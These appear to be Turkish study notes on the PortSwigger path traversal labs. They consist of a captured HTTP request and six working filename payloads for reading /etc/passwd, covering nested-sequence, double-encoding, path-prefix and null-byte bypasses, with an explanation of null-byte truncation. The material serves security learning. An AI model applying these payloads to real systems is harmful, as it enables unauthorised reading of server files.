GET /image?filename=../../../etc/passwd HTTP/2
Host: 0afd00f603ec7cfb82bc4cb100200054.web-security-academy.net
Cookie: session=jXFsyJWwbDZF38rDIC3VeQ67oWEALJck
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0afd00f603ec7cfb82bc4cb100200054.web-security-academy.net/product?productId=1
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Priority: u=5
Te: trailers

- BurpSuite kullanarak bu requesti yakaladım
### path traversal labları çözümleri
1. filename parametresine filename=../../../etc/passwd ekleyince lab çözüldü.
2. Bu sefer filename parametresine /etc/passwd yazınca çözüldü.
3. Bu labda .. ve / engelleniyordu ben de bu şekilde kullandım filename=....//....//....//etc/passwd ve dosyaya eriştim.
4. Bu labda ise decode yapmak gerekiyordu, filename=..%25%32%66..%25%32%66..%25%32%66etc%25%32%66passwd şeklinde / işaretini iki kere url dönüşümü yaptım.
5. Burada filename=/var/www/images şeklindeydi ben de filename=/var/www/images/../../../etc/passwd şeklinde yapıp istenen dosyaya ulşatım.
6. filename=../../../etc/passwd%00.png
### 📝 Kısa not: `%00` neden çalıştı?

PortSwigger lab’ında `%00` (null byte) şu yüzden işe yaradı:

* `%00` = **null byte (`\0`) temsilidir**
* Bazı sistemlerde (özellikle C tabanlı file işlemlerinde) string **null byte görünce burada biter**
* Uygulama filename’in sonuna `.png` eklese bile, OS tarafı `%00` gördüğü yerde stringi keser

---

### 🔥 Sonuç mantığı

* Uygulama şunu sanır:
  `../../../etc/passwd.png`

* Ama sistem şunu görür:
  `../../../etc/passwd`  ← `%00` sonrası yok sayılır

---

### 🧠 Özet cümle

> `%00`, stringi erken sonlandırdığı için uygulamanın eklediği `.png` uzantısını etkisiz hale getirdi ve dosya yolu traversal çalıştı.
---
🔹 1. %00 bir “kalıp” değil, encoding’dir
%00 = URL-encoded null byte
Aslında gerçek hali: \0
% işareti burada “parametre ayırma” değil, hex encode göstergesidir

📌 Yani:

%00 = 0x00 (null byte)